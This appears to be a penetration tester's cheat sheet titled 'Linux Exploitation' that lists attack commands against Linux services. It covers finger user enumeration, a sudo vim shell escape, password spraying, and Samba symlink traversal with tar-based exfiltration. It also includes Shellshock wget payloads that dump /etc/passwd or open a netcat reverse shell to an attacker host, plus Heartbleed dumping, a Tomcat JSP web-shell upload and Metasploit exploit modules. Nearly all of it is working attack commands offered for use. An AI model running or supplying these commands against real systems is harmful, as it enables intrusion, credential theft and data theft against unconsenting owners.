### Linux Exploitation 
_1.1 Info Gathering_  
```
Finger
# nmap --script finger IPAddr -p79 //Query finger service for users
# finger sshd@IPAddr //display login specified for shell
# for name in $(cat /usr/share/wordlists/metasploit/unix_users.txt); do finger $name@IPAddr; done > valid_users.txt //Enumerate valid unix users using the finger service, loop

Local Information Gathering
Low Priv User
//wget linuxprivchecker to /tmp folder or local
$ python linuxprivchecker.py > enum //then can $cat enum |less to view results

sudo /usr/bin/apt edit-sources ../../../../../tmp/foo
//select /usr/bin/vim.basic if available, vim will let escape to shell
// in vim, :!sh for shell escape


```
_1.2 Remote Exploitation_  
```
exploit/multi/http/php_cgi_arg_injection //PHP up to version 5.3.12 and 5.4.2 is vulnerable
exploit/linux/misc/drb_remote_codeexec //Attacking Port 8787 Ruby DRb RMI

python -c 'import pty; pty.spawn("/bin/sh/")' //Upgrade shell
```
```
Password Spray Attack
//create a user name txt file
auxiliary/scanner/smtp/smtp_enum
//create list of validated user accounts
//perform reverse brute-force aka password spray using 1 or 2 max most common passwords against list of validated users
//more service login brute-force modules
auxiliary/scanner/smb/smb_login
auxiliary/scanner/http/owa_login
```
```
Exploiting Samba
//fingerprint samba service
nmap --script smb-os-discovery -p445 ipAddr
//Searchsploit Smb version

smbmap -H TargetAddress //determine shares available on SMB server, and permissions
//If have a WRITEABLE share, then can use symlink directory traversal
auxiliary/admin/smb/samba_symlink_traversal
smbclient \\\\TargetIP\\tmp -N //Login anonymously into share and change into created directory
tar c ../tmp/all_files.tar * //creates archive of all files in current directory for data exfiltration to local system's /tmp directory
tar xf /tmp/all_files.tar //extract and start enumerating files for sensitive content
grep -r "password" * 2>&1 /dev/null

//if www share writeable, can use a webshell for reverse shell. Ex. putting shell on www share and pointing browser to it
//Set up netcat listener to same as in webshell
nc -n -l -v -p 1234 
```
```
Exploiting Shellshock
CVEs 2014-6271,6277,6278,7169,7186,7187
$ env x='() { :;} echo vulnerable' bash -c "echo this is a test" //on local system, when executed on vulnerable system, shell will echo vulnerable
//find CGI programs on web server
$ ./dirsearch.py -u http://TargetIP/ -e cgi -r
//check whether .cgi program vulnerable to shellshock
nmap --script http-shellshock --script-args uri=/cgi-bin/login.cgi TargetIP -p 80
$ wget -U "() { foo;};echo; \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://TargetIP/cgi-bin/login.cgi && cat login.cgi //Issue GET request to target system against vulnerable cgi program, and echos passwd file to our attacker box
$ wget -U "() { foo;};echo; /bin/nc <AttackerIP> <Netcat Listener Port> -e /bin/sh" http://TargetIP/cgi-bin/login.cgi && cat login.cgi //issue get request against vulnerable cgi program with netcat reverse shell payload
```
```
Heartbleed Information Disclosure
auxiliary/scanner/ssl/openssl_heartbleed //can use to scan for and dump info
nmap --script ssl-heartbleed TargetIP
```
```
Tomcat/Apache
auxiliary/scanner/http/tomcat_mgr_login
//Upload JSP war shell. One can be found in /usr/share/laudanum/ or created with msfvenom
//Browse to uploaded .jsp in browser, try id and cat /etc/passwd
```
```
Java RMI Registry
nmap -sT TargetIP -p 1099 -sV //RMI endpoint can sometimes be on non-standard ports
exploit/multi/misc/java_rmi_server
```


